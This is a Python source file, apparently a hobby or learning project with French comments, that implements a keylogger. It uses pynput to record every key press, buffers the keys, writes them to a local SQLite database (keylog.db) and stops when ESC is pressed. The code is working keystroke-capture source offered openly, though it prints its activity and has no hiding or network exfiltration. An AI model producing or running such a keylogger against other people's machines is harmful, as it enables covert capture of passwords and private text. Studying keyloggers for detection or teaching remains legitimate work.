#  listener.py 

from pynput import keyboard
import threading
from datetime import datetime
import os
import logger

# ── CONFIGURATION ────────────────────────────────────────────
BUFFER_SIZE = 20

# ── VARIABLES GLOBALES ───────────────────────────────────────
buffer = []
last_timestamp = None   
lock = threading.Lock()


# ── FONCTIONS UTILITAIRES ────────────────────────────────────

def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key.name}]"


def flush_buffer():
    if not buffer:
        return []

    key_data = buffer.copy()  # copie avant de vider — bonne idée, on garde ça

    for key_str in key_data:
        logger.log_key(key_str, window="unknown")  # écriture en DB

    buffer.clear()
    return key_data


# ── CALLBACKS ────────────────────────────────────────────────

def on_press(key):   

    global last_timestamp  


    timestamp = datetime.now().strftime("%H:%M:%S")
    key_str = format_key(key)

    if key_str is None:
        return

    with lock:
        buffer.append(key_str)
        last_timestamp = timestamp  # maintenant ça modifie bien le global

        if len(buffer) >= BUFFER_SIZE:
            flush_buffer()

    print(f"[{timestamp}] Capturé : {key_str}")


def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[*] Touche ESC détectée — arrêt du listener.")
        with lock:
            if buffer:
                flush_buffer()
        return False


# ── CLASSE PRINCIPALE ────────────────────────────────────────

class KeyLogger:
    def __init__(self):
        self.listener = None
        self.is_running = False

    def start(self):
        logger.init_db()  

        print("[*] Démarrage du listener...")
        print(f"[*] Logs écrits dans : {os.path.abspath('keylog.db')}")

        print("[*] ESC pour stop.\n")

        self.is_running = True

        self.listener = keyboard.Listener(
            on_press=on_press,
            on_release=on_release
        )

        self.listener.daemon = True  
        self.listener.start()
        self.listener.join()

        self.is_running = False
        print("[*] Arrêté proprement.")

    def stop(self):
        if self.listener and self.is_running:
            self.listener.stop()


# ── POINT D'ENTRÉE ───────────────────────────────────────────

if __name__ == "__main__":
    kl = KeyLogger()  
    kl.start()